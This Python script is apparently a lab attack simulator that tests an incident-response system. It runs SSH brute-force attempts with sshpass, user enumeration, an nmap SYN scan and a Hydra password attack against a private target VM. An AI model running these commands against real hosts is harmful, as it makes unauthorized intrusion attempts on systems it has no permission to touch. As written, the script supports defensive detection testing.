#!/usr/bin/env python3
"""
VM2 Attack Scripts - SSH Brute Force and Attack Simulation
IP: 192.168.100.10 (Attacker)
Target: 192.168.100.20 (Defender)

This script simulates various attack patterns to test the IR system.
"""

import subprocess
import time
import sys
from datetime import datetime

TARGET_IP = "192.168.100.20"
TARGET_PORT = 22

class AttackSimulator:
    def __init__(self, target_ip=TARGET_IP):
        self.target = target_ip
        self.port = TARGET_PORT
        
    def print_banner(self, title):
        print("\n" + "="*60)
        print(f"  {title}")
        print("="*60)
    
    def brute_force_attack(self):
        """
        Trigger: Brute Force Detection Rule
        Method: 3 failed SSH login attempts within 60 seconds
        """
        self.print_banner("Attack 1: SSH Brute Force (3 attempts)")
        print(f"Target: {self.target}:{self.port}")
        print(f"Expected Detection: Brute Force (High severity)")
        print("")
        
        users = ['root', 'admin', 'test']
        password = 'wrongpassword123'
        
        for i, user in enumerate(users, 1):
            print(f"[{i}/3] Attempting login as {user}...")
            cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{self.target} 'echo test' 2>&1"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print(f"  Result: Failed (as expected)")
            time.sleep(2)
        
        print("\n✅ Brute Force attack completed")
        print("⏳ Wait 10 seconds for detection...")
        time.sleep(10)
    
    def rapid_login_attempts(self):
        """
        Trigger: Rapid Login Attempts Detection Rule
        Method: 10 failed SSH login attempts within 30 seconds
        """
        self.print_banner("Attack 2: Rapid Login Attempts (10 attempts)")
        print(f"Target: {self.target}:{self.port}")
        print(f"Expected Detection: Brute Force (Critical severity)")
        print("")
        
        password = 'wrongpassword123'
        
        for i in range(1, 11):
            print(f"[{i}/10] Rapid attempt...")
            cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 user{i}@{self.target} 'echo test' 2>&1"
            subprocess.run(cmd, shell=True, capture_output=True)
            time.sleep(2)  # 2 seconds between attempts = 20 seconds total
        
        print("\n✅ Rapid login attempts completed")
        print("⏳ Wait 10 seconds for detection...")
        time.sleep(10)
    
    def user_enumeration(self):
        """
        Trigger: User Enumeration Detection Rule
        Method: 5 invalid user attempts within 2 minutes
        """
        self.print_banner("Attack 3: User Enumeration (6 invalid users)")
        print(f"Target: {self.target}:{self.port}")
        print(f"Expected Detection: User Enumeration (Medium severity)")
        print("")
        
        invalid_users = ['testuser1', 'testuser2', 'testuser3', 'testuser4', 'testuser5', 'testuser6']
        password = 'anypassword'
        
        for i, user in enumerate(invalid_users, 1):
            print(f"[{i}/6] Trying invalid user: {user}...")
            cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@{self.target} 'echo test' 2>&1"
            subprocess.run(cmd, shell=True, capture_output=True)
            time.sleep(3)
        
        print("\n✅ User enumeration completed")
        print("⏳ Wait 10 seconds for detection...")
        time.sleep(10)
    
    def port_scan(self):
        """
        Reconnaissance: Port scanning
        """
        self.print_banner("Attack 4: Port Scan (Reconnaissance)")
        print(f"Target: {self.target}")
        print(f"Method: Nmap SYN scan")
        print("")
        
        print("Running: nmap -sS -p 1-1000 " + self.target)
        cmd = f"sudo nmap -sS -p 1-1000 {self.target}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(result.stdout)
        
        print("\n✅ Port scan completed")
    
    def hydra_brute_force(self):
        """
        Advanced: Hydra brute force (if hydra is installed)
        """
        self.print_banner("Attack 5: Hydra SSH Brute Force")
        print(f"Target: {self.target}:{self.port}")
        print(f"Method: Hydra with small wordlist")
        print("")
        
        # Check if hydra is installed
        check = subprocess.run("which hydra", shell=True, capture_output=True)
        if check.returncode != 0:
            print("⚠️  Hydra not installed. Skipping this attack.")
            print("   Install with: sudo apt install hydra")
            return
        
        # Create small wordlist
        wordlist = "/tmp/test_passwords.txt"
        with open(wordlist, 'w') as f:
            f.write("password\\n123456\\nadmin\\nroot\\ntest\\n")
        
        print(f"Running: hydra -l root -P {wordlist} ssh://{self.target}")
        cmd = f"hydra -l root -P {wordlist} -t 4 ssh://{self.target}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        print(result.stdout)
        
        print("\n✅ Hydra attack completed")
        time.sleep(5)

def main():
    print("\n" + "="*60)
    print("  VM2 Attack Simulator")
    print("  Attacker IP: 192.168.100.10")
    print("  Target IP: 192.168.100.20")
    print("="*60)
    
    # Check if sshpass is installed
    check = subprocess.run("which sshpass", shell=True, capture_output=True)
    if check.returncode != 0:
        print("\n❌ ERROR: sshpass is not installed")
        print("Install with: sudo apt install sshpass")
        sys.exit(1)
    
    attacker = AttackSimulator(TARGET_IP)
    
    print("\nAvailable Attacks:")
    print("1. Brute Force (3 failed logins)")
    print("2. Rapid Login Attempts (10 failed logins)")
    print("3. User Enumeration (6 invalid users)")
    print("4. Port Scan (Nmap)")
    print("5. Hydra Brute Force (advanced)")
    print("6. Run All Attacks")
    print("0. Exit")
    
    while True:
        print("\n" + "-"*60)
        choice = input("Select attack (0-6): ").strip()
        
        if choice == '0':
            print("\n👋 Exiting...")
            break
        elif choice == '1':
            attacker.brute_force_attack()
        elif choice == '2':
            attacker.rapid_login_attempts()
        elif choice == '3':
            attacker.user_enumeration()
        elif choice == '4':
            attacker.port_scan()
        elif choice == '5':
            attacker.hydra_brute_force()
        elif choice == '6':
            print("\n🚀 Running all attacks sequentially...")
            attacker.brute_force_attack()
            attacker.rapid_login_attempts()
            attacker.user_enumeration()
            attacker.port_scan()
            attacker.hydra_brute_force()
            print("\n✅ All attacks completed!")
        else:
            print("❌ Invalid choice")
        
        print("\n💡 Check the dashboard on VM1: http://192.168.100.20:8501")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
